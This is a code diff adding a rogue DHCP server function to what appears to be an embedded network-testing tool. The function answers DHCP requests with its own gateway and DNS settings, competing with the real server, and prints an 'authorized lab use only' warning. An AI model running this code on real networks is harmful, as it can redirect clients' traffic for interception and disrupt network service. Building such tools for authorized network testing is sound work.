@@ -394,3 +394,91 @@ void DhcpTest::renewTest(uint32_t leaseSecs, uint32_t timeoutMs)
         Serial.println("DHCP renew-test: no renew ACK (server may require rebind/broadcast).");
     }
 }
+
+// =============================================================================
+// Rogue DHCP server
+// =============================================================================
+// Extract the DHCP message type (option 53) from a received BOOTP message.
+static uint8_t dhcpMsgType(const uint8_t *msg, uint16_t len)
+{
+    if (len < 241 || wrd32(msg + 236) != DHCP_MAGIC) return 0;
+    uint16_t o = 240;
+    while (o + 1 < len) {
+        uint8_t opt = msg[o];
+        if (opt == 255) break;
+        if (opt == 0) { o++; continue; }
+        uint8_t l = msg[o + 1];
+        if (opt == 53 && l >= 1) return msg[o + 2];
+        o += 2 + l;
+    }
+    return 0;
+}
+
+uint32_t DhcpTest::rogueServer(uint32_t poolStart, uint32_t mask, uint32_t gateway,
+                               uint32_t dns, uint32_t seconds)
+{
+    uint32_t serverId = _ip.ip();
+    if (serverId == 0) {
+        Serial.println("Rogue DHCP: set a static IP first (ip static ...).");
+        return 0;
+    }
+    char si[16], gw[16]; ipToStr(serverId, si); ipToStr(gateway, gw);
+    Serial.printf("\r\nRogue DHCP server for %lu s. server-id %s, gw %s\r\n",
+                  (unsigned long)seconds, si, gw);
+    Serial.println("Answering DISCOVER->OFFER and REQUEST->ACK. Any key aborts.");
+    Serial.println("(Authorized lab use only -- this competes with the real DHCP server.)");
+
+    static uint8_t rx[600];
+    static uint8_t pkt[512];
+    uint32_t deadline = millis() + seconds * 1000UL;
+    uint32_t nextIp = poolStart;
+    uint32_t leases = 0;
+
+    while ((int32_t)(deadline - millis()) > 0) {
+        uint32_t srcIp; uint16_t srcPort, rlen;
+        if (!_ip.recvUDP(DHCP_DPORT, &srcIp, &srcPort, rx, &rlen, sizeof(rx), 500)) {
+            if (Serial.available()) { while (Serial.available()) Serial.read(); break; }
+            continue;
+        }
+        if (rlen < 240 || rx[0] != BOOTP_REQUEST) continue;
+        uint8_t mt = dhcpMsgType(rx, rlen);
+        if (mt != DHCP_DISCOVER && mt != DHCP_REQUEST) continue;
+
+        uint32_t xid = wrd32(rx + 4);
+        uint8_t chaddr[6]; memcpy(chaddr, rx + 28, 6);
+        uint32_t offer = nextIp;
+
+        // Build server reply (OFFER or ACK).
+        memset(pkt, 0, 300);
+        pkt[0] = 2;            // op = BOOTP REPLY
+        pkt[1] = 1; pkt[2] = 6;
+        wput32(pkt + 4, xid);
+        wput32(pkt + 16, offer);       // yiaddr
+        wput32(pkt + 20, serverId);    // siaddr
+        memcpy(pkt + 28, chaddr, 6);
+        wput32(pkt + 236, DHCP_MAGIC);
+        uint16_t o = 240;
+        pkt[o++] = 53; pkt[o++] = 1; pkt[o++] = (mt == DHCP_DISCOVER) ? DHCP_OFFER : DHCP_ACK;
+        pkt[o++] = 54; pkt[o++] = 4; wput32(pkt + o, serverId); o += 4;
+        pkt[o++] = 51; pkt[o++] = 4; wput32(pkt + o, 3600);     o += 4;   // lease
+        pkt[o++] = 1;  pkt[o++] = 4; wput32(pkt + o, mask ? mask : 0xFFFFFF00UL); o += 4;
+        if (gateway) { pkt[o++] = 3; pkt[o++] = 4; wput32(pkt + o, gateway); o += 4; }
+        if (dns)     { pkt[o++] = 6; pkt[o++] = 4; wput32(pkt + o, dns);     o += 4; }
+        pkt[o++] = 255;
+        if (o < 300) o = 300;
+
+        _ip.sendUDP(serverId, 0xFFFFFFFFUL, DHCP_DPORT, DHCP_SPORT, pkt, o);
+
+        char a[16]; ipToStr(offer, a);
+        Serial.printf("  %s %02X:%02X:%02X:%02X:%02X:%02X -> %s %s\r\n",
+                      mt == DHCP_DISCOVER ? "DISCOVER" : "REQUEST ",
+                      chaddr[0], chaddr[1], chaddr[2], chaddr[3], chaddr[4], chaddr[5],
+                      a, mt == DHCP_DISCOVER ? "(OFFER)" : "(ACK)");
+        if (mt == DHCP_REQUEST) { leases++; nextIp++; }
+        if (Serial.available()) { while (Serial.available()) Serial.read(); break; }
+    }
+    Serial.printf("Rogue DHCP server stopped. %lu lease(s) handed out.\r\n",
+                  (unsigned long)leases);
+    return leases;
+}
+
